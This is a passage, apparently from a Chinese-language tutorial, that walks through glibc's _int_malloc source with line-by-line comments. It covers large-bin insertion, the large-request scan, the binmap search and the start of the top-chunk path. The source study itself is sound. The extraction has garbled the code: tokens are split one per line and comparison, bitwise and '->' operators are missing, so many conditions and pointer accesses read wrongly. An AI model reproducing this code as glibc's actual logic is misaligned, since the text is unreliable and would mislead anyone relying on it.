bin\n\n\n\u628a\u53d6\u51fa\u6765\u7684 chunk \u653e\u5230\u5bf9\u5e94\u7684 small bin \u4e2d\u3002\n\n\n            \n/* place chunk in bin */\n\n\n            \nif\n \n(\nin_smallbin_range\n(\nsize\n))\n \n{\n\n                \nvictim_index\n \n=\n \nsmallbin_index\n(\nsize\n);\n\n                \nbck\n          \n=\n \nbin_at\n(\nav\n,\n \nvictim_index\n);\n\n                \nfwd\n          \n=\n \nbck\n-\nfd\n;\n\n\n\n\n\nplace chunk in large bin\n\n\n\u628a\u53d6\u51fa\u6765\u7684 chunk \u653e\u5230\u5bf9\u5e94\u7684 large bin \u4e2d\u3002\n\n\n            \n}\n \nelse\n \n{\n\n                \n// large bin\u8303\u56f4\n\n                \nvictim_index\n \n=\n \nlargebin_index\n(\nsize\n);\n\n                \nbck\n          \n=\n \nbin_at\n(\nav\n,\n \nvictim_index\n);\n\n                \nfwd\n          \n=\n \nbck\n-\nfd\n;\n\n\n                \n/* maintain large bins in sorted order */\n\n                \n/* \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u603b\u7ed3\u51fa\uff0clargebin \u4ee5 fd_nextsize \u9012\u51cf\u6392\u5e8f\u3002\n\n\n                   \u540c\u6837\u5927\u5c0f\u7684 chunk\uff0c\u540e\u6765\u7684\u53ea\u4f1a\u63d2\u5165\u5230\u4e4b\u524d\u540c\u6837\u5927\u5c0f\u7684 chunk \u540e\uff0c\n\n\n                   \u800c\u4e0d\u4f1a\u4fee\u6539\u4e4b\u524d\u76f8\u540c\u5927\u5c0f\u7684fd/bk_nextsize\uff0c\u8fd9\u4e5f\u5f88\u5bb9\u6613\u7406\u89e3\uff0c\n\n\n                   \u53ef\u4ee5\u51cf\u4f4e\u5f00\u9500\u3002\u6b64\u5916\uff0cbin \u5934\u4e0d\u53c2\u4e0e nextsize \u94fe\u63a5\u3002*/\n\n                \n// \u5982\u679c large bin \u94fe\u8868\u4e0d\u7a7a\n\n                \nif\n \n(\nfwd\n \n!=\n \nbck\n)\n \n{\n\n                    \n/* Or with inuse bit to speed comparisons */\n\n                    \n// \u52a0\u901f\u6bd4\u8f83\uff0c\u5e94\u8be5\u4e0d\u4ec5\u4ec5\u6709\u8fd9\u4e2a\u8003\u8651\uff0c\u56e0\u4e3a\u94fe\u8868\u91cc\u7684chunk\u90fd\u4f1a\u8bbe\u7f6e\u8be5\u4f4d\u3002\n\n                    \nsize\n \n|=\n \nPREV_INUSE\n;\n\n                    \n/* if smaller than smallest, bypass loop below */\n\n                    \n// bck-bk \u5b58\u50a8\u7740\u76f8\u5e94 large bin \u4e2d\u6700\u5c0f\u7684chunk\u3002\n\n                    \n// \u5982\u679c\u904d\u5386\u7684 chunk \u6bd4\u5f53\u524d\u6700\u5c0f\u7684\u8fd8\u8981\u5c0f\uff0c\u90a3\u5c31\u53ea\u9700\u8981\u63d2\u5165\u5230\u94fe\u8868\u5c3e\u90e8\u3002\n\n                    \n// \u5224\u65ad bck-\nbk \u662f\u4e0d\u662f\u5728 main arena\u3002\n\n                    \nassert\n(\nchunk_main_arena\n(\nbck\n-\nbk\n));\n\n                    \nif\n \n((\nunsigned\n \nlong\n)\n \n(\nsize\n)\n \n\n                        \n(\nunsigned\n \nlong\n)\n \nchunksize_nomask\n(\nbck\n-\nbk\n))\n \n{\n\n                        \n// \u4ee4 fwd \u6307\u5411 bin \u5934\n\n                        \nfwd\n \n=\n \nbck\n;\n\n                        \n// \u4ee4 bck \u6307\u5411 bin \u5c3e\n\n                        \nbck\n \n=\n \nbck\n-\nbk\n;\n\n                        \n// victim \u7684 fd_nextsize \u6307\u5411\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a chunk\n\n                        \nvictim\n-\nfd_nextsize\n \n=\n \nfwd\n-\nfd\n;\n\n                        \n// victim \u7684 bk_nextsize \u6307\u5411\u539f\u6765\u94fe\u8868\u7684\u7b2c\u4e00\u4e2achunk \u6307\u5411\u7684bk_nextsize\n\n                        \nvictim\n-\nbk_nextsize\n \n=\n \nfwd\n-\nfd\n-\nbk_nextsize\n;\n\n                        \n// \u539f\u6765\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a chunk \u7684 bk_nextsize \u6307\u5411 victim\n\n                        \n// \u539f\u6765\u6307\u5411\u94fe\u8868\u7b2c\u4e00\u4e2a chunk \u7684 fd_nextsize \u6307\u5411 victim\n\n                        \nfwd\n-\nfd\n-\nbk_nextsize\n \n=\n\n                            \nvictim\n-\nbk_nextsize\n-\nfd_nextsize\n \n=\n \nvictim\n;\n\n                    \n}\n \nelse\n \n{\n\n                        \n// \u5f53\u524d\u8981\u63d2\u5165\u7684 victim \u7684\u5927\u5c0f\u5927\u4e8e\u6700\u5c0f\u7684 chunk \n\n                        \n// \u5224\u65ad fwd \u662f\u5426\u5728 main arena\n\n                        \nassert\n(\nchunk_main_arena\n(\nfwd\n));\n\n                        \n// \u4ece\u94fe\u8868\u5934\u90e8\u5f00\u59cb\u627e\u5230\u4e0d\u6bd4 victim \u5927\u7684 chunk\n\n                        \nwhile\n \n((\nunsigned\n \nlong\n)\n \nsize\n \n \nchunksize_nomask\n(\nfwd\n))\n \n{\n\n                            \nfwd\n \n=\n \nfwd\n-\nfd_nextsize\n;\n\n                            \nassert\n(\nchunk_main_arena\n(\nfwd\n));\n\n                        \n}\n\n                        \n// \u5982\u679c\u627e\u5230\u4e86\u4e00\u4e2a\u548c victim \u4e00\u6837\u5927\u7684 chunk\uff0c\n\n                        \n// \u90a3\u5c31\u76f4\u63a5\u5c06 chunk \u63d2\u5165\u5230\u8be5chunk\u7684\u540e\u9762\uff0c\u5e76\u4e0d\u4fee\u6539 nextsize \u6307\u9488\u3002\n\n                        \nif\n \n((\nunsigned\n \nlong\n)\n \nsize\n \n==\n\n                            \n(\nunsigned\n \nlong\n)\n \nchunksize_nomask\n(\nfwd\n))\n\n                            \n/* Always insert in the second position.  */\n\n                            \nfwd\n \n=\n \nfwd\n-\nfd\n;\n\n                        \nelse\n \n{\n\n                            \n// \u5982\u679c\u627e\u5230\u7684chunk\u548c\u5f53\u524dvictim\u5927\u5c0f\u4e0d\u4e00\u6837\n\n                            \n// \u90a3\u4e48\u5c31\u9700\u8981\u6784\u9020 nextsize \u53cc\u5411\u94fe\u8868\u4e86\n\n                            \nvictim\n-\nfd_nextsize\n              \n=\n \nfwd\n;\n\n                            \nvictim\n-\nbk_nextsize\n              \n=\n \nfwd\n-\nbk_nextsize\n;\n\n                            \nfwd\n-\nbk_nextsize\n                 \n=\n \nvictim\n;\n\n                            \nvictim\n-\nbk_nextsize\n-\nfd_nextsize\n \n=\n \nvictim\n;\n\n                        \n}\n\n                        \nbck\n \n=\n \nfwd\n-\nbk\n;\n\n                    \n}\n\n                \n}\n \nelse\n\n                    \n// \u5982\u679c\u7a7a\u7684\u8bdd\uff0c\u76f4\u63a5\u7b80\u5355\u4f7f\u5f97 fd_nextsize \u4e0e bk_nextsize \u6784\u6210\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\u5373\u53ef\u3002\n\n                    \nvictim\n-\nfd_nextsize\n \n=\n \nvictim\n-\nbk_nextsize\n \n=\n \nvictim\n;\n\n            \n}\n\n\n\n\n\n\u6700\u7ec8\u53d6\u51fa\n\n\n            \n// \u653e\u5230\u5bf9\u5e94\u7684 bin \u4e2d\uff0c\u6784\u6210 bk\n--\nvictim\n--\nfwd\u3002\n\n            \nmark_bin\n(\nav\n,\n \nvictim_index\n);\n\n            \nvictim\n-\nbk\n \n=\n \nbck\n;\n\n            \nvictim\n-\nfd\n \n=\n \nfwd\n;\n\n            \nfwd\n-\nbk\n    \n=\n \nvictim\n;\n\n            \nbck\n-\nfd\n    \n=\n \nvictim\n;\n\n\n\n\n\nwhile \u8fed\u4ee3\u6b21\u6570\n\n\nwhile \u6700\u591a\u8fed\u4ee310000\u6b21\u540e\u9000\u51fa\u3002\n\n\n            \n// \n\n\n##define MAX_ITERS 10000\n\n            \nif\n \n(\n++\niters\n \n=\n \nMAX_ITERS\n)\n \nbreak\n;\n\n        \n}\n\n\n\n\n\nlarge chunk\n\n\n\u6ce8\uff1a \u6216\u8bb8\u4f1a\u5f88\u5947\u602a\uff0c\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u6ca1\u6709\u5148\u53bb\u770b small chunk \u662f\u5426\u6ee1\u8db3\u65b0\u9700\u6c42\u4e86\u5462\uff1f\u8fd9\u662f\u56e0\u4e3asmall bin \u5728\u5faa\u73af\u4e4b\u524d\u5df2\u7ecf\u5224\u65ad\u8fc7\u4e86\uff0c\u8fd9\u91cc\u5982\u679c\u6709\u7684\u8bdd\uff0c\u5c31\u662f\u5408\u5e76\u540e\u7684\u624d\u51fa\u73b0chunk\u3002\u4f46\u662f\u5728\u5927\u5faa\u73af\u5916\uff0clarge chunk \u53ea\u662f\u5355\u7eaf\u5730\u627e\u5230\u5176\u7d22\u5f15\uff0c\u6240\u4ee5\u89c9\u5f97\u5728\u8fd9\u91cc\u76f4\u63a5\u5148\u5224\u65ad\u662f\u5408\u7406\u7684\uff0c\u800c\u4e14\u4e5f\u4e3a\u4e86\u4e0b\u9762\u53ef\u4ee5\u518d\u53bb\u627e\u8f83\u5927\u7684chunk\u3002\n\n\n\u5982\u679c\u8bf7\u6c42\u7684 chunk \u5728 large chunk \u8303\u56f4\u5185\uff0c\u5c31\u5728\u5bf9\u5e94\u7684 bin \u4e2d\u4ece\u5c0f\u5230\u5927\u8fdb\u884c\u626b\u63cf\uff0c\u627e\u5230\u7b2c\u4e00\u4e2a\u5408\u9002\u7684\u3002\n\n\n        \n/*\n\n\n           If a large request, scan through the chunks of current bin in\n\n\n           sorted order to find smallest that fits.  Use the skip list for this.\n\n\n         */\n\n        \nif\n \n(\n!\nin_smallbin_range\n(\nnb\n))\n \n{\n\n            \nbin\n \n=\n \nbin_at\n(\nav\n,\n \nidx\n);\n\n            \n/* skip scan if empty or largest chunk is too small */\n\n            \n// \u5982\u679c\u5bf9\u5e94\u7684 bin \u4e3a\u7a7a\u6216\u8005\u5176\u4e2d\u7684chunk\u6700\u5927\u7684\u4e5f\u5f88\u5c0f\uff0c\u90a3\u5c31\u8df3\u8fc7\n\n            \n// first(bin)=bin-\nfd \u8868\u793a\u5f53\u524d\u94fe\u8868\u4e2d\u6700\u5927\u7684chunk\n\n            \nif\n \n((\nvictim\n \n=\n \nfirst\n(\nbin\n))\n \n!=\n \nbin\n \n\n                \n(\nunsigned\n \nlong\n)\n \nchunksize_nomask\n(\nvictim\n)\n \n=\n\n                    \n(\nunsigned\n \nlong\n)\n \n(\nnb\n))\n \n{\n\n                \n// \u53cd\u5411\u904d\u5386\u94fe\u8868\uff0c\u76f4\u5230\u627e\u5230\u7b2c\u4e00\u4e2a\u4e0d\u5c0f\u4e8e\u6240\u9700chunk\u5927\u5c0f\u7684chunk\n\n                \nvictim\n \n=\n \nvictim\n-\nbk_nextsize\n;\n\n                \nwhile\n \n(((\nunsigned\n \nlong\n)\n \n(\nsize\n \n=\n \nchunksize\n(\nvictim\n))\n \n\n                        \n(\nunsigned\n \nlong\n)\n \n(\nnb\n)))\n\n                    \nvictim\n \n=\n \nvictim\n-\nbk_nextsize\n;\n\n\n                \n/* Avoid removing the first entry for a size so that the skip\n\n\n                   list does not have to be rerouted.  */\n\n                \n// \u5982\u679c\u6700\u7ec8\u53d6\u5230\u7684chunk\u4e0d\u662f\u8be5bin\u4e2d\u7684\u6700\u540e\u4e00\u4e2achunk\uff0c\u5e76\u4e14\u8be5chunk\u4e0e\u5176\u524d\u9762\u7684chunk\n\n                \n// \u7684\u5927\u5c0f\u76f8\u540c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53d6\u5176\u524d\u9762\u7684chunk\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u8c03\u6574bk_nextsize,fd_nextsize\n\n                \n//  \u94fe\u8868\u3002\u56e0\u4e3a\u5927\u5c0f\u76f8\u540c\u7684chunk\u53ea\u6709\u4e00\u4e2a\u4f1a\u88ab\u4e32\u5728nextsize\u94fe\u4e0a\u3002\n\n                \nif\n \n(\nvictim\n \n!=\n \nlast\n(\nbin\n)\n \n\n                    \nchunksize_nomask\n(\nvictim\n)\n \n==\n \nchunksize_nomask\n(\nvictim\n-\nfd\n))\n\n                    \nvictim\n \n=\n \nvictim\n-\nfd\n;\n\n                \n// \u8ba1\u7b97\u5206\u914d\u540e\u5269\u4f59\u7684\u5927\u5c0f\n\n                \nremainder_size\n \n=\n \nsize\n \n-\n \nnb\n;\n\n                \n// \u8fdb\u884cunlink\n\n                \nunlink\n(\nav\n,\n \nvictim\n,\n \nbck\n,\n \nfwd\n);\n\n\n                \n/* Exhaust */\n\n                \n// \u5269\u4e0b\u7684\u5927\u5c0f\u4e0d\u8db3\u4ee5\u5f53\u505a\u4e00\u4e2a\u5757\n\n                \n// \u5f88\u597d\u5947\u63a5\u4e0b\u6765\u4f1a\u600e\u4e48\u529e\uff1f\n\n                \nif\n \n(\nremainder_size\n \n \nMINSIZE\n)\n \n{\n\n                    \nset_inuse_bit_at_offset\n(\nvictim\n,\n \nsize\n);\n\n                    \nif\n \n(\nav\n \n!=\n \nmain_arena\n)\n \nset_non_main_arena\n(\nvictim\n);\n\n                \n}\n\n                \n/* Split */\n\n                \n//  \u5269\u4e0b\u7684\u5927\u5c0f\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2achunk\uff0c\u8fdb\u884c\u5206\u5272\u3002\n\n                \nelse\n \n{\n\n                    \n// \u83b7\u53d6\u5269\u4e0b\u90a3\u90e8\u5206chunk\u7684\u6307\u9488\uff0c\u79f0\u4e3aremainder\n\n                    \nremainder\n \n=\n \nchunk_at_offset\n(\nvictim\n,\n \nnb\n);\n\n                    \n/* We cannot assume the unsorted list is empty and therefore\n\n\n                       have to perform a complete insert here.  */\n\n                    \n// \u63d2\u5165unsorted bin\u4e2d\n\n                    \nbck\n \n=\n \nunsorted_chunks\n(\nav\n);\n\n                    \nfwd\n \n=\n \nbck\n-\nfd\n;\n\n                    \n// \u5224\u65ad unsorted bin \u662f\u5426\u88ab\u7834\u574f\u3002\n\n                    \nif\n \n(\n__glibc_unlikely\n(\nfwd\n-\nbk\n \n!=\n \nbck\n))\n \n{\n\n                        \nerrstr\n \n=\n \nmalloc(): corrupted unsorted chunks\n;\n\n                        \ngoto\n \nerrout\n;\n\n                    \n}\n\n                    \nremainder\n-\nbk\n \n=\n \nbck\n;\n\n                    \nremainder\n-\nfd\n \n=\n \nfwd\n;\n\n                    \nbck\n-\nfd\n       \n=\n \nremainder\n;\n\n                    \nfwd\n-\nbk\n       \n=\n \nremainder\n;\n\n                    \n// \u5982\u679c\u4e0d\u5904\u4e8esmall bin\u8303\u56f4\u5185\uff0c\u5c31\u8bbe\u7f6e\u5bf9\u5e94\u7684\u5b57\u6bb5\n\n                    \nif\n \n(\n!\nin_smallbin_range\n(\nremainder_size\n))\n \n{\n\n                        \nremainder\n-\nfd_nextsize\n \n=\n \nNULL\n;\n\n                        \nremainder\n-\nbk_nextsize\n \n=\n \nNULL\n;\n\n                    \n}\n\n                    \n// \u8bbe\u7f6e\u5206\u914d\u7684chunk\u7684\u6807\u8bb0\n\n                    \nset_head\n(\nvictim\n,\n\n                             \nnb\n \n|\n \nPREV_INUSE\n \n|\n\n                                 \n(\nav\n \n!=\n \nmain_arena\n \n?\n \nNON_MAIN_ARENA\n \n:\n \n0\n));\n\n\n                    \n// \u8bbe\u7f6eremainder\u7684\u4e0a\u4e00\u4e2achunk\uff0c\u5373\u5206\u914d\u51fa\u53bb\u7684chunk\u7684\u4f7f\u7528\u72b6\u6001\n\n                    \n// \u5176\u4f59\u7684\u4e0d\u7528\u7ba1\uff0c\u76f4\u63a5\u4ece\u4e0a\u9762\u7ee7\u627f\u4e0b\u6765\u4e86\n\n                    \nset_head\n(\nremainder\n,\n \nremainder_size\n \n|\n \nPREV_INUSE\n);\n\n                    \n// \u8bbe\u7f6eremainder\u7684\u5927\u5c0f\n\n                    \nset_foot\n(\nremainder\n,\n \nremainder_size\n);\n\n                \n}\n\n                \n// \u68c0\u67e5\n\n                \ncheck_malloced_chunk\n(\nav\n,\n \nvictim\n,\n \nnb\n);\n\n                \n// \u8f6c\u6362\u4e3amem\u72b6\u6001\n\n                \nvoid\n \n*\np\n \n=\n \nchunk2mem\n(\nvictim\n);\n\n                \n// \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff\n\n                \nalloc_perturb\n(\np\n,\n \nbytes\n);\n\n                \nreturn\n \np\n;\n\n            \n}\n\n        \n}\n\n\n\n\n\n\u5bfb\u627e\u8f83\u5927 chunk\n\n\n\u5982\u679c\u8d70\u5230\u4e86\u8fd9\u91cc\uff0c\u90a3\u8bf4\u660e\u5bf9\u4e8e\u7528\u6237\u6240\u9700\u7684chunk\uff0c\u4e0d\u80fd\u76f4\u63a5\u4ece\u5176\u5bf9\u5e94\u7684\u5408\u9002\u7684bin\u4e2d\u83b7\u53d6chunk\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u6765\u67e5\u627e\u6bd4\u5f53\u524d bin \u66f4\u5927\u7684 fast bin \uff0c small bin \u6216\u8005 large bin\u3002\n\n\n        \n/*\n\n\n           Search for a chunk by scanning bins, starting with next largest\n\n\n           bin. This search is strictly by best-fit; i.e., the smallest\n\n\n           (with ties going to approximately the least recently used) chunk\n\n\n           that fits is selected.\n\n\n\n           The bitmap avoids needing to check that most blocks are nonempty.\n\n\n           The particular case of skipping all bins during warm-up phases\n\n\n           when no chunks have been returned yet is faster than it might look.\n\n\n         */\n\n\n        \n++\nidx\n;\n\n        \n// \u83b7\u53d6\u5bf9\u5e94\u7684bin\n\n        \nbin\n   \n=\n \nbin_at\n(\nav\n,\n \nidx\n);\n\n        \n// \u83b7\u53d6\u5f53\u524d\u7d22\u5f15\u5728binmap\u4e2d\u7684block\u7d22\u5f15\n\n        \n// #define idx2block(i) ((i) \n BINMAPSHIFT)  ,BINMAPSHIFT=5\n\n        \n// Binmap\u6309block\u7ba1\u7406\uff0c\u6bcf\u4e2ablock\u4e3a\u4e00\u4e2aint\uff0c\u517132\u4e2abit\uff0c\u53ef\u4ee5\u8868\u793a32\u4e2abin\u4e2d\u662f\u5426\u6709\u7a7a\u95f2chunk\u5b58\u5728\n\n        \n// \u6240\u4ee5\u8fd9\u91cc\u662f\u53f3\u79fb5\n\n        \nblock\n \n=\n \nidx2block\n(\nidx\n);\n\n        \n// \u83b7\u53d6\u5f53\u524d\u5757\u5927\u5c0f\u5bf9\u5e94\u7684\u6620\u5c04\uff0c\u8fd9\u91cc\u53ef\u4ee5\u5f97\u77e5\u76f8\u5e94\u7684bin\u4e2d\u662f\u5426\u6709\u7a7a\u95f2\u5757\n\n        \nmap\n   \n=\n \nav\n-\nbinmap\n[\n \nblock\n \n];\n\n        \n// #define idx2bit(i) ((1U \n ((i) \n ((1U \n BINMAPSHIFT) - 1))))\n\n        \n// \u5c06idx\u5bf9\u5e94\u7684\u6bd4\u7279\u4f4d\u8bbe\u7f6e\u4e3a1\uff0c\u5176\u5b83\u4f4d\u4e3a0\n\n        \nbit\n   \n=\n \nidx2bit\n(\nidx\n);\n\n        \nfor\n \n(;;)\n \n{\n\n\n\n\n\n\u627e\u5230\u4e00\u4e2a\u5408\u9002\u7684 map\n\n\n            \n/* Skip rest of block if there are no more set bits in this block.\n\n\n             */\n\n            \n// \u5982\u679cbit\nmap\uff0c\u5219\u8868\u793a\u8be5 map \u4e2d\u6ca1\u6709\u6bd4\u5f53\u524d\u6240\u9700\u8981chunk\u5927\u7684\u7a7a\u95f2\u5757\n\n            \n// \u5982\u679cbit\u4e3a0\uff0c\u90a3\u4e48\u8bf4\u660e\uff0c\u4e0a\u9762idx2bit\u5e26\u5165\u7684\u53c2\u6570\u4e3a0\u3002\n\n            \nif\n \n(\nbit\n \n \nmap\n \n||\n \nbit\n \n==\n \n0\n)\n \n{\n\n                \ndo\n \n{\n\n                    \n// \u5bfb\u627e\u4e0b\u4e00\u4e2ablock\uff0c\u76f4\u5230\u5176\u5bf9\u5e94\u7684map\u4e0d\u4e3a0\u3002\n\n                    \n// \u5982\u679c\u5df2\u7ecf\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u90a3\u5c31\u53ea\u80fd\u4f7f\u7528top chunk\u4e86\n\n                    \nif\n \n(\n++\nblock\n \n=\n \nBINMAPSIZE\n)\n \n/* out of bins */\n\n                        \ngoto\n \nuse_top\n;\n\n                \n}\n \nwhile\n \n((\nmap\n \n=\n \nav\n-\nbinmap\n[\n \nblock\n \n])\n \n==\n \n0\n);\n\n                \n// \u83b7\u53d6\u5176\u5bf9\u5e94\u7684bin\uff0c\u56e0\u4e3a\u8be5map\u4e2d\u7684chunk\u5927\u5c0f\u90fd\u6bd4\u6240\u9700\u7684chunk\u5927\uff0c\u800c\u4e14\n\n                \n// map\u672c\u8eab\u4e0d\u4e3a0\uff0c\u6240\u4ee5\u5fc5\u7136\u5b58\u5728\u6ee1\u8db3\u9700\u6c42\u7684chunk\u3002\n\n                \nbin\n \n=\n \nbin_at\n(\nav\n,\n \n(\nblock\n \n \nBINMAPSHIFT\n));\n\n                \nbit\n \n=\n \n1\n;\n\n            \n}\n\n\n\n\n\n\u627e\u5230\u5408\u9002\u7684 bin\n\n\n            \n/* Advance to bin with set bit. There must be one. */\n\n            \n// \u4ece\u5f53\u524dmap\u7684\u6700\u5c0f\u7684bin\u4e00\u76f4\u627e\uff0c\u76f4\u5230\u627e\u5230\u5408\u9002\u7684bin\u3002\n\n            \n// \u8fd9\u91cc\u662f\u4e00\u5b9a\u5b58\u5728\u7684\n\n            \nwhile\n \n((\nbit\n \n \nmap\n)\n \n==\n \n0\n)\n \n{\n\n                \nbin\n \n=\n \nnext_bin\n(\nbin\n);\n\n                \nbit\n \n=\n \n1\n;\n\n                \nassert\n(\nbit\n \n!=\n \n0\n);\n\n            \n}\n\n\n\n\n\n\u7b80\u5355\u68c0\u67e5 chunk\n\n\n            \n/* Inspect the bin. It is likely to be non-empty */\n\n            \n// \u83b7\u53d6\u5bf9\u5e94\u7684bin\n\n            \nvictim\n \n=\n \nlast\n(\nbin\n);\n\n\n            \n/*  If a false alarm (empty bin), clear the bit. */\n\n            \n// \u5982\u679cvictim=bin\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5c06map\u5bf9\u5e94\u7684\u4f4d\u6e050\uff0c\u7136\u540e\u83b7\u53d6\u4e0b\u4e00\u4e2abin\n\n            \n// \u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\u7684\u6982\u7387\u5e94\u8be5\u5f88\u5c0f\u3002\n\n            \nif\n \n(\nvictim\n \n==\n \nbin\n)\n \n{\n\n                \nav\n-\nbinmap\n[\n \nblock\n \n]\n \n=\n \nmap\n \n=\n \n~\nbit\n;\n \n/* Write through */\n\n                \nbin\n                 \n=\n \nnext_bin\n(\nbin\n);\n\n                \nbit\n \n=\n \n1\n;\n\n            \n}\n\n\n\n\n\n\u771f\u6b63\u53d6\u51fachunk\n\n\n            \nelse\n \n{\n\n                \n// \u83b7\u53d6\u5bf9\u5e94victim\u7684\u5927\u5c0f\n\n                \nsize\n \n=\n \nchunksize\n(\nvictim\n);\n\n\n                \n/*  We know the first chunk in this bin is big enough to use. */\n\n                \nassert\n((\nunsigned\n \nlong\n)\n \n(\nsize\n)\n \n=\n \n(\nunsigned\n \nlong\n)\n \n(\nnb\n));\n\n                \n// \u8ba1\u7b97\u5206\u5272\u540e\u5269\u4f59\u7684\u5927\u5c0f\n\n                \nremainder_size\n \n=\n \nsize\n \n-\n \nnb\n;\n\n\n                \n/* unlink */\n\n                \nunlink\n(\nav\n,\n \nvictim\n,\n \nbck\n,\n \nfwd\n);\n\n\n                \n/* Exhaust */\n\n                \n// \u5982\u679c\u5206\u5272\u540e\u4e0d\u591f\u4e00\u4e2achunk\u600e\u4e48\u529e\uff1f\n\n                \nif\n \n(\nremainder_size\n \n \nMINSIZE\n)\n \n{\n\n                    \nset_inuse_bit_at_offset\n(\nvictim\n,\n \nsize\n);\n\n                    \nif\n \n(\nav\n \n!=\n \nmain_arena\n)\n \nset_non_main_arena\n(\nvictim\n);\n\n                \n}\n\n\n                \n/* Split */\n\n                \n// \u5982\u679c\u591f\uff0c\u5c3d\u7ba1\u5206\u5272\n\n                \nelse\n \n{\n\n                    \n// \u8ba1\u7b97\u5269\u4f59\u7684chunk\u7684\u504f\u79fb\n\n                    \nremainder\n \n=\n \nchunk_at_offset\n(\nvictim\n,\n \nnb\n);\n\n\n                    \n/* We cannot assume the unsorted list is empty and therefore\n\n\n                       have to perform a complete insert here.  */\n\n                    \n// \u5c06\u5269\u4f59\u7684chunk\u63d2\u5165\u5230unsorted bin\u4e2d\n\n                    \nbck\n \n=\n \nunsorted_chunks\n(\nav\n);\n\n                    \nfwd\n \n=\n \nbck\n-\nfd\n;\n\n                    \nif\n \n(\n__glibc_unlikely\n(\nfwd\n-\nbk\n \n!=\n \nbck\n))\n \n{\n\n                        \nerrstr\n \n=\n \nmalloc(): corrupted unsorted chunks 2\n;\n\n                        \ngoto\n \nerrout\n;\n\n                    \n}\n\n                    \nremainder\n-\nbk\n \n=\n \nbck\n;\n\n                    \nremainder\n-\nfd\n \n=\n \nfwd\n;\n\n                    \nbck\n-\nfd\n       \n=\n \nremainder\n;\n\n                    \nfwd\n-\nbk\n       \n=\n \nremainder\n;\n\n\n                    \n/* advertise as last remainder */\n\n                    \n// \u5982\u679c\u5728small bin\u8303\u56f4\u5185\uff0c\u5c31\u5c06\u5176\u6807\u8bb0\u4e3aremainder\n\n                    \nif\n \n(\nin_smallbin_range\n(\nnb\n))\n \nav\n-\nlast_remainder\n \n=\n \nremainder\n;\n\n                    \nif\n \n(\n!\nin_smallbin_range\n(\nremainder_size\n))\n \n{\n\n                        \nremainder\n-\nfd_nextsize\n \n=\n \nNULL\n;\n\n                        \nremainder\n-\nbk_nextsize\n \n=\n \nNULL\n;\n\n                    \n}\n\n                    \n// \u8bbe\u7f6evictim\u7684\u4f7f\u7528\u72b6\u6001\n\n                    \nset_head\n(\nvictim\n,\n\n                             \nnb\n \n|\n \nPREV_INUSE\n \n|\n\n                                 \n(\nav\n \n!=\n \nmain_arena\n \n?\n \nNON_MAIN_ARENA\n \n:\n \n0\n));\n\n                    \n// \u8bbe\u7f6eremainder\u7684\u4f7f\u7528\u72b6\u6001\uff0c\u8fd9\u91cc\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f\n\n                    \nset_head\n(\nremainder\n,\n \nremainder_size\n \n|\n \nPREV_INUSE\n);\n\n                    \n// \u8bbe\u7f6eremainder\u7684\u5927\u5c0f\n\n                    \nset_foot\n(\nremainder\n,\n \nremainder_size\n);\n\n                \n}\n\n                \n// \u68c0\u67e5\n\n                \ncheck_malloced_chunk\n(\nav\n,\n \nvictim\n,\n \nnb\n);\n\n                \n// chunk\u72b6\u6001\u8f6c\u6362\u5230mem\u72b6\u6001\n\n                \nvoid\n \n*\np\n \n=\n \nchunk2mem\n(\nvictim\n);\n\n                \n// \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff\n\n                \nalloc_perturb\n(\np\n,\n \nbytes\n);\n\n                \nreturn\n \np\n;\n\n            \n}\n\n\n\n\n\n\u4f7f\u7528 top chunk\n\n\n\u5982\u679c\u6240\u6709\u7684 bin \u4e2d\u7684 chunk \u90fd\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u6ee1\u8db3\u8981\u6c42\uff08\u5373\u4e0d\u5408\u5e76\uff09\uff0c\u6216\u8005\u8bf4\u90fd\u6ca1\u6709\u7a7a\u95f2\u7684 chunk\u3002\u90a3\u4e48\u6211\u4eec\u5c31\u53ea\u80fd\u4f7f\u7528 top chunk \u4e86\u3002\n\n\n    \nuse_top\n:\n\n        \n/*\n\n\n           If large enough, split off the chunk bordering the end of memory\n\n\n           (held in av-\ntop). Note that this is in accord with the best-fit\n\n\n           search rule.  In effect, av-\ntop is treated as larger (and thus\n\n\n           less well fitting) than any other available chunk since it can\n\n\n           be extended to be as large as necessary (up to system\n\n\n           limitations).\n\n\n\n           We require that av-\ntop always exists (i.e., has size \n=\n\n\n           MINSIZE) after initialization, so if it would otherwise be\n\n\n           exhausted by current request, it is replenished. (The main\n\n\n           reason for ensuring it exists is that we may need MINSIZE space\n\n\n           to put in fenceposts in sysmalloc.)\n\n\n         */\n\n        \n// \u83b7\u53d6\u5f53\u524d\u7684top chunk\uff0c\u5e76\u8ba1\u7b97\u5176\u5bf9\u5e94\u7684\u5927\u5c0f\n\n        \nvictim\n \n=\n \nav\n-\ntop\n;\n\n        \nsize\n   \n=\n \nchunksize\n(\nvictim\n);\n\n        \n// \u5982\u679c\u5206\u5272\u4e4b\u540e\uff0ctop chunk \u5927\u5c0f\u4ecd\u7136\u6ee1\u8db3 chunk \u7684\u6700\u5c0f\u5927\u5c0f\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u5272\u3002\n\n        \nif\n \n((\nunsigned\n \nlong\n)\n \n(\nsize\n)\n \n=\n \n(\nunsigned\n \nlong\n)\n \n(\nnb\n \n+\n \nMINSIZE\n))\n \n{\n\n            \nremainder_size\n \n=\n \nsize\n \n-\n \nnb\n;\n\n            \nremainder\n      \n=\n \nchunk_at_offset\n(\nvictim\n,\n \nnb\n);\n\n            \nav\n-\ntop\n        